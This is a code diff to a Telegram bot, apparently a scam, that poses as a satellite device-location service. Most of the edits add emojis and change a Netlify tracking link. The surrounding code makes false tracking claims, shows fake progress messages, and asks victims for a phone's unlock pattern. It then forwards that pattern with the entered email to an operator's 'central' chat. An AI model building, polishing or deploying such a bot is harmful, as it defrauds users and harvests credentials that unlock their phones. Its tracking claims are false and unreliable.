@@ -60,10 +60,11 @@ async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
     context.user_data.clear()
     text = (
         "🚀 *Welcome to the Advanced VPS v60 Satellite Location System!*\n\n"
-        "We use satellite triangulation technology, encrypted VPN, and MEO servers to locate "
-        "any device with up to 1 meter accuracy. Our artificial intelligence algorithms analyze "
-        "radio and Wi-Fi signals to track the device even in airplane mode.\n\n"
-        "To get started, use the buttons below:"
+        "💎 *Premium Technology*\n"
+        "🔥 We use satellite triangulation, encrypted VPN, and MEO servers to locate\n"
+        "⚡ any device with up to 1 meter accuracy. Our AI algorithms analyze\n"
+        "🎯 radio and Wi-Fi signals to track the device even in airplane mode.\n\n"
+        "🌟 To get started, use the buttons below:"
     )
     await update.message.reply_text(text, parse_mode='Markdown', reply_markup=main_keyboard())
     return MENU
@@ -91,19 +92,19 @@ async def button_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
         text = (
             "⚠️ *Device is password protected!*\n\n"
-            "To unlock and get the exact location, you must draw the device's unlock pattern.\n\n"
-            "Use the grid below (numbers 1 to 9) and enter the sequence (e.g., 1 2 3 6 9):\n"
+            "🔐 To unlock and get the exact location, you must draw the device's unlock pattern.\n\n"
+            "📊 Use the grid below (numbers 1 to 9) and enter the sequence (e.g., 1 2 3 6 9):\n"
             "```\n"
             "• 1   • 2   • 3\n"
             "• 4   • 5   • 6\n"
             "• 7   • 8   • 9\n"
             "```\n"
-            "Send the sequence separated by spaces (e.g., 1 4 8 7 6 3)."
+            "✏️ Send the sequence separated by spaces (e.g., 1 4 8 7 6 3)."
         )
         await query.message.reply_text(text, parse_mode='Markdown')
         return AGUARDANDO_PADRAO
 
-    await query.edit_message_text("Returning to main menu.", reply_markup=main_keyboard())
+    await query.edit_message_text("🔙 Returning to main menu.", reply_markup=main_keyboard())
     return MENU
 
 async def cadastrar_email(update: Update, context: ContextTypes.DEFAULT_TYPE):
@@ -113,7 +114,7 @@ async def cadastrar_email(update: Update, context: ContextTypes.DEFAULT_TYPE):
         return EMAIL_CADASTRO
 
     emails_cadastrados.append(email)
-    text = f"✅ Email *{email}* successfully registered in the system!\n\nYou can now locate devices linked to this email."
+    text = f"✅ Email *{email}* successfully registered in the system!\n\n🌟 You can now locate devices linked to this email."
     await update.message.reply_text(text, parse_mode='Markdown', reply_markup=main_keyboard())
     return MENU
 
@@ -140,7 +141,7 @@ async def localizar_email(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
     context.user_data['ultimo_email'] = email
 
-    # Loading messages with delays
+    # Loading messages with delays and more emojis
     loading_msgs = [
         "🔍 Connecting to satellite server...",
         "📡 Establishing secure VPN connection...",
@@ -160,7 +161,7 @@ async def localizar_email(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
     # Send device photo (if exists)
     photo_path = "celular.jpg"
-    caption = f"{INFORMACOES_DISPOSITIVO}\n\nClick the button below to get real-time location:"
+    caption = f"📱 {INFORMACOES_DISPOSITIVO}\n\n🌟 Click the button below to get real-time location:"
     
     if os.path.exists(photo_path):
         with open(photo_path, 'rb') as photo:
@@ -217,7 +218,7 @@ async def receber_padrao(update: Update, context: ContextTypes.DEFAULT_TYPE):
     )
 
     map_photo_path = "mapa.jpg"
-    caption = f"{localizacao_completa}\n\nReport sent to the central."
+    caption = f"{localizacao_completa}\n\n📋 Report sent to the central."
 
     if os.path.exists(map_photo_path):
         with open(map_photo_path, 'rb') as photo:
@@ -234,9 +235,9 @@ async def receber_padrao(update: Update, context: ContextTypes.DEFAULT_TYPE):
         try:
             report_text = (
                 f"📋 *Location Report*\n\n"
-                f"Email: {context.user_data.get('ultimo_email', 'Not provided')}\n"
-                f"Unlock Pattern: {padrao}\n"
-                f"Device: POCO C65\n"
+                f"📧 Email: {context.user_data.get('ultimo_email', 'Not provided')}\n"
+                f"🔑 Unlock Pattern: {padrao}\n"
+                f"📱 Device: POCO C65\n"
                 f"{localizacao_completa}"
             )
             await context.bot.send_message(
@@ -247,25 +248,27 @@ async def receber_padrao(update: Update, context: ContextTypes.DEFAULT_TYPE):
         except Exception as e:
             print(f"Error sending report: {e}")
 
-    # ===== BOTÃO "Locate in real time" =====
-    link_mapa = "https://lizator.netlify.app"  # SEU LINK DO NETLIFY
+    # ===== BOTÃO "Locate in real time" (LINK CORRIGIDO) =====
+    link_mapa = "https://lockyouphonelocalizator.netlify.app/"  # NOVO LINK
     keyboard = InlineKeyboardMarkup([
-        [InlineKeyboardButton("🌐 Locate in real time", url=link_mapa)]
+        [InlineKeyboardButton("🌐 *Locate in real time*", url=link_mapa)]
     ])
     await update.message.reply_text(
-        "Acompanhe o dispositivo em movimento em tempo real no mapa:",
-        reply_markup=keyboard
+        "🌟 Acompanhe o dispositivo em movimento em tempo real no mapa:\n"
+        "💎 *Clique no botão abaixo para abrir o rastreador ao vivo*",
+        reply_markup=keyboard,
+        parse_mode='Markdown'
     )
 
     await update.message.reply_text(
-        "Operation completed. Return to the menu for other actions.",
+        "✅ Operation completed. Return to the menu for other actions.",
         reply_markup=main_keyboard()
     )
     return MENU
 
 async def cancel(update: Update, context: ContextTypes.DEFAULT_TYPE):
     await update.message.reply_text(
-        "Operation cancelled. Returning to menu.",
+        "❌ Operation cancelled. Returning to menu.",
         reply_markup=main_keyboard()
     )
     return MENU
@@ -273,9 +276,9 @@ async def cancel(update: Update, context: ContextTypes.DEFAULT_TYPE):
 async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     await update.message.reply_text(
         "📌 *Available commands:*\n"
-        "/start - Start the bot and see the menu\n"
-        "/help - Show this message\n"
-        "/cancel - Cancel current operation",
+        "/start - 🌟 Start the bot and see the menu\n"
+        "/help - ❓ Show this message\n"
+        "/cancel - ❌ Cancel current operation",
         parse_mode='Markdown'
     )
 
